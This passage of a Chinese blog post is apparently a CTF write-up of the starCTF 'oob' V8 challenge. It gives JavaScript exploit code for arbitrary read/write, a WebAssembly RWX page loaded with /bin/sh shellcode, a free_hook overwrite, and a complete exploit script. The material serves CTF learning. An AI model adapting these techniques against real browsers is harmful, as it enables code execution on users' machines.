<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function read64(addr)</span><br><span class="line">&#123;</span><br><span class="line">	fake_array[2] &#x3D; u2f(addr - 0x10n + 0x1n);</span><br><span class="line">	let leak_data &#x3D; f2u(fake_object[0]);</span><br><span class="line">	console.log(&quot;[*] leak from: 0x&quot; + hex(addr) + &quot;: 0x&quot; + hex(leak_data));</span><br><span class="line">	return leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write64(addr, data)</span><br><span class="line">&#123;</span><br><span class="line">	fake_array[2] &#x3D; u2f(addr - 0x10n + 1n);</span><br><span class="line">	fake_object[0] &#x3D; u2f(data);</span><br><span class="line">	console.log(&quot;[*] write to: 0x&quot; + hex(addr) + &quot;: 0x&quot; + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="wasm-方式"><a href="#wasm-方式" class="headerlink" title="wasm 方式"></a>wasm 方式</h2><p>常见的方式就是加载wasm, 找到rwx的地址，然后通过修改ArrayBuffer的backing_store地址为rwx的地址，将shellcode 写入，然后调用wasm function 就行了。<br>wasm 找rwx 段(不同版本偏移kennel不一样)：</p>
<p>func_addr-&gt;shared_info-&gt;data-&gt;instance + 0x88</p>
<p>由于我们有addrof了， 实际上addr_of(WebAssembly.Instance) 就能够拿到地址了，省去了自己找地址的麻烦。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var wasmCode &#x3D; new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">var wasmModule &#x3D; new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">var f &#x3D; wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var f_addr &#x3D; addressOf(f);</span><br><span class="line">console.log(&quot;[*] leak wasm func addr: 0x&quot; + hex(f_addr));</span><br><span class="line">var shared_info_addr &#x3D; read64(f_addr + 0x18n) - 0x1n;</span><br><span class="line">var wasm_exported_func_data_addr &#x3D; read64(shared_info_addr + 0x8n) - 0x1n;</span><br><span class="line">var wasm_instance_addr &#x3D; read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;</span><br><span class="line">var rwx_page_addr &#x3D; read64(wasm_instance_addr + 0x88n);</span><br><span class="line"></span><br><span class="line">console.log(&quot;[*] leak rwx_page_addr: 0x&quot; + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line">var shellcode &#x3D; [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">var data_buf &#x3D; new ArrayBuffer(24);</span><br><span class="line">var data_view &#x3D; new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr &#x3D; addressOf(data_buf) + 0x20n;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(0, u2f(shellcode[0]), true);</span><br><span class="line">data_view.setFloat64(8, u2f(shellcode[1]), true);</span><br><span class="line">data_view.setFloat64(16, u2f(shellcode[2]), true);</span><br><span class="line">&#x2F;&#x2F;%SystemBreak();</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<h2 id="稳定利用方式"><a href="#稳定利用方式" class="headerlink" title="稳定利用方式"></a>稳定利用方式</h2><p>v8在生成一个数组对象过程中，会对应着生成一个code对象，这个code对象中存储了和该数组对象相关的构造函数指令，而这些构造函数指令又会去调用d8二进制中的指令地址来完成对数组对象的构造。因此可以用来泄漏d8地址，进而修改got表执行/bin/sh.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; [1.1, 2.2, 3.3];</span><br><span class="line">&#x2F;&#x2F;%DebugPrint(a);</span><br><span class="line">var code_addr &#x3D; read64(addressOf(a.constructor) + 0x30n);</span><br><span class="line">var leak_d8_addr &#x3D; read64(code_addr + 0x41n);</span><br><span class="line">console.log(&quot;[*] find leak_d8_addr: 0x&quot; + hex(leak_d8_addr));</span><br><span class="line">&#x2F;&#x2F; %SystemBreak();</span><br><span class="line"></span><br><span class="line">var d8_base_addr &#x3D; leak_d8_addr - 0xad54e0n;</span><br><span class="line"></span><br><span class="line">console.log(&quot;[*] find d8_base_addr: 0x&quot; + hex(d8_base_addr));</span><br><span class="line">var free_got_addr &#x3D; d8_base_addr + 0xd99ec8n</span><br><span class="line">var free_addr &#x3D; read64(free_got_addr);</span><br><span class="line">console.log(&quot;[*] free address: 0x&quot; + hex(free_addr));</span><br><span class="line">var libc_base_addr &#x3D; free_addr - 0x97950n;</span><br><span class="line">console.log(&#39;libcbase&#39; + hex(libc_base_addr));</span><br><span class="line">&#x2F;&#x2F; %SystemBreak();</span><br><span class="line">var system_addr &#x3D; libc_base_addr + 0x4f440n;</span><br><span class="line">console.log(&quot;[*] system address: 0x&quot; + hex(system_addr));</span><br><span class="line">var free_hook_addr &#x3D; libc_base_addr + 0x3ed8e8n;</span><br><span class="line">console.log(&quot;[*] free_hook address: 0x&quot; + hex(free_hook_addr))</span><br><span class="line"></span><br><span class="line">write64_dataview(free_hook_addr, system_addr);</span><br><span class="line"></span><br><span class="line">function get_shell() </span><br><span class="line">&#123;</span><br><span class="line">	let get_shell_buffer &#x3D; new ArrayBuffer(0x100);</span><br><span class="line">	let get_shell_dataview &#x3D; new DataView(get_shell_buffer);</span><br><span class="line">	get_shell_dataview.setFloat64(0, u2f(0x0068732f6e69622fn), true);</span><br><span class="line">	&#x2F;&#x2F;%DebugPrint(get_shell_dataview);</span><br><span class="line">	&#x2F;&#x2F;%SystemBreak();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure>

<p>另外还有一种方法是通过map 找堆地址，然后进一步找程序基址的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var test_addr &#x3D; addrof(test);</span><br><span class="line">var map_ptr &#x3D; arb_read(test_addr - 1n);</span><br><span class="line">var map_sec_base &#x3D; map_ptr - 0x2f79n;</span><br><span class="line">var heap_ptr &#x3D; arb_read(map_sec_base + 0x18n);</span><br><span class="line">var PIE_leak &#x3D; arb_read(heap_ptr);</span><br><span class="line">var PIE_base &#x3D; PIE_leak - 0xd87ea8n;</span><br></pre></td></tr></table></figure>

<h2 id="不稳定利用方式"><a href="#不稳定利用方式" class="headerlink" title="不稳定利用方式"></a>不稳定利用方式</h2><p>不稳定的方法和前面的方法差不多，关键在于内存搜索一定的特征，根据特征找d8的地址，进而找到libc等地址，然后进行利用。这部分就不展开了。</p>
<h1 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h1><p>exp 来自于其他博客，仅供参考</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">var buf &#x3D; new ArrayBuffer(16);</span><br><span class="line">var float64 &#x3D; new Float64Array(buf);</span><br><span class="line">var bigUint64 &#x3D; new BigUint64Array(buf);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;float -&gt; uint64</span><br><span class="line">function f2u(f)</span><br><span class="line">&#123;</span><br><span class="line">	float64[0] &#x3D; f;</span><br><span class="line">	return bigUint64[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;uint64 -&gt; float</span><br><span class="line">function u2f(u)</span><br><span class="line">&#123;</span><br><span class="line">	bigUint64[0] &#x3D; u;</span><br><span class="line">	return float64[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hex(u)</span><br><span class="line">&#123;</span><br><span class="line">	return u.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj &#x3D; &#123;&quot;a&quot;: 1&#125;</span><br><span class="line">var obj_array &#x3D; [obj]</span><br><span class="line">var float_array &#x3D; [1.1]</span><br><span class="line"></span><br><span class="line">var obj_array_map &#x3D; obj_array.oob()</span><br><span class="line">var float_array_map &#x3D; float_array.oob()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;leaking object&#39;s address</span><br><span class="line">function addressOf(obj_to_leak)</span><br><span class="line">&#123;</span><br><span class="line">	obj_array[0] &#x3D; obj_to_leak;</span><br><span class="line">	obj_array.oob(float_array_map);</span><br><span class="line">	let obj_addr &#x3D; f2u(obj_array[0]) - 1n;</span><br><span class="line">	&#x2F;&#x2F;restore the obj map</span><br><span class="line">	obj_array.oob(obj_array_map);</span><br><span class="line">	return obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;turn addr to object</span><br><span class="line">function fakeObject(addr_to_fake)</span><br><span class="line">&#123;</span><br><span class="line">	float_array[0] &#x3D; u2f(addr_to_fake + 1n);</span><br><span class="line">	float_array.oob(obj_array_map);</span><br><span class="line">	let faked_obj &#x3D; float_array[0];</span><br><span class="line">	&#x2F;&#x2F;restore the float map</span><br><span class="line">	float_array.oob(float_array_map);</span><br><span class="line">	return faked_obj;</span><br><span class="line">&#125;</span><br><span class="line">var fake_array &#x3D; [</span><br><span class="line">	float_array_map,</span><br><span class="line">	u2f(0n),</span><br><span class="line">	u2f(0x41414141n),</span><br><span class="line">	u2f(0x1000000000n),</span><br><span class="line">    1.1</span><br><span class="line">	];</span><br><span class="line"></span><br><span class="line">%DebugPrint(fake_array);</span><br><span class="line">var fake_array_addr &#x3D; addressOf(fake_array);</span><br><span class="line"></span><br><span class="line">console.log(&quot;fake_array: &quot; + hex(fake_array_addr));</span><br><span class="line">var fake_object_addr &#x3D; fake_array_addr - 0x38n + 0x10n;</span><br><span class="line">&#x2F;&#x2F; %SystemBreak();</span><br><span class="line">%DebugPrint(fake_object_addr)</span><br><span class="line">var fake_object &#x3D; fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line">function read64(addr)</span><br><span class="line">&#123;</span><br><span class="line">	fake_array[2] &#x3D; u2f(addr - 0x10n + 0x1n);</span><br><span class="line">	let leak_data &#x3D; f2u(fake_object[0]);</span><br><span class="line">	console.log(&quot;[*] leak from: 0x&quot; + hex(addr) + &quot;: 0x&quot; + hex(leak_data));</span><br><span class="line">	return leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write64(addr, data)</span><br><span class="line">&#123;</span><br><span class="line">	fake_array[2] &#x3D; u2f(addr - 0x10n + 1n);</span><br><span class="line">	fake_object[0] &#x3D; u2f(data);</span><br><span class="line">	console.log(&quot;[*] write to: 0x&quot; + hex(addr) + &quot;: 0x&quot; + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var wasmCode &#x3D; new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">var wasmModule &#x3D; new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">var f &#x3D; wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var f_addr &#x3D; addressOf(f);</span><br><span class="line">console.log(&quot;[*] leak wasm func addr: 0x&quot; + hex(f_addr));</span><br><span class="line">var shared_info_addr &#x3D; read64(f_addr + 0x18n) - 0x1n;</span><br><span class="line">var wasm_exported_func_data_addr &#x3D; read64(shared_info_addr + 0x8n) - 0x1n;</span><br><span class="line">var wasm_instance_addr &#x3D; read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;</span><br><span class="line">var wasm_instance_addr2 &#x3D; addressOf(wasmInstance);</span><br><span class="line">%DebugPrint(wasm_instance_addr);</span><br><span class="line">%DebugPrint(wasm_instance_addr2);</span><br><span class="line">var rwx_page_addr &#x3D; read64(wasm_instance_addr2 + 0x88n);</span><br><span class="line"></span><br><span class="line">console.log(&quot;[*] leak rwx_page_addr: 0x&quot; + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line">var shellcode &#x3D; [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">var data_buf &#x3D; new ArrayBuffer(24);</span><br><span class="line">var data_view &#x3D; new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr &#x3D; addressOf(data_buf) + 0x20n;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(0, u2f(shellcode[0]), true);</span><br><span class="line">data_view.setFloat64(8, u2f(shellcode[1]), true);</span><br><span class="line">data_view.setFloat64(16, u2f(shellcode[2]), true);</span><br><span class="line">&#x2F;&#x2F;%SystemBreak();</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我又变强了一点点。</p>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>引用的文章太多了，但凡带了starctf oob 的博客我都翻了一遍，感谢这些博客:).</p>

            <div class="clearfix"></div>
            <hr class="nogutter">
        </div>
        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
    
    <a class="pull-left" href="/2021/06/19/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="float: left;">
        ← browser-pwn cve-2020-6418漏洞分析
    </a>
    
    
    <a class="pull-right" href="/2021/05/18/35C3-krautflare-exploit/">
        35C3 krautflare exploit →
    </a>
    
</nav>

        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
  /**
   * 搜狐畅言
   */

  /*
  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');

  window.onload = function () {
    (function () {
      var appid = 'cytXXXX';
      var conf = 'prod_xxxxxxxxxxxxxxxxx';
      var width = window.innerWidth || document.documentElement.clientWidth;
      var loadJs = function (d, a, id) {
        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
        var b = document.createElement("script");
        b.setAttribute("type", "text/javascript");
        b.setAttribute("charset", "UTF-8");
        b.setAttribute("src", d);
        if (id) {
          b.setAttribute("id", id);
        }
        if (typeof a === "function") {
          if (window.attachEvent) {
            b.onreadystatechange = function () {
              var e = b.readyState;
              if (e === "loaded" || e === "complete") {
                b.onreadystatechange = null;
                a()
              }
            }
          } else {
            b.onload = a
          }
        }
        c.appendChild(b)
      };

      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
        window.changyan.api.config({
          appid: appid,
          conf: conf
        })
      });
    })();
  }
  */

</script>
</div>
    </div>
</section>


      
<!-- ============================ Footer =========================== -->

<footer>
    <div class="container">
            <div class="copy">
                <p>
                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By N1ko. All Rights Reserved.
                </p>
                <p>Theme By <a href="//go.kieran.top" target="_blank" rel="noopener" style="color: #767D84">Kieran</a></p>
            </div>
            <div class="social">
                <ul>
                    
                    <li><a href="https://github.com/tinyniko" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://twitter.com/nikos233__" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
                    
                    
                    
                    
                </ul>
            </div>
            <div class="clearfix"> </div>
        </div>
</footer>

<!-- ============================ END Footer =========================== -->
      <!-- Load our scripts -->
<!-- Resizable 'on-demand' full-height hero -->
<script type="text/javascript">
    var resizeHero = function () {
        var hero = $(".cover,.heightblock"),
            window1 = $(window);
        hero.css({
            "height": window1.height()
        });
    };

    resizeHero();

    $(window).resize(function () {
        resizeHero();
    });
</script>
<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
<script src="/js/scripts.js"></script><!-- Theme scripts -->


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$('#intro').find('img').each(function(){
  var alt = this.alt;

  if (alt){
    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
  }

  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
});
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



      
</body>
</html>
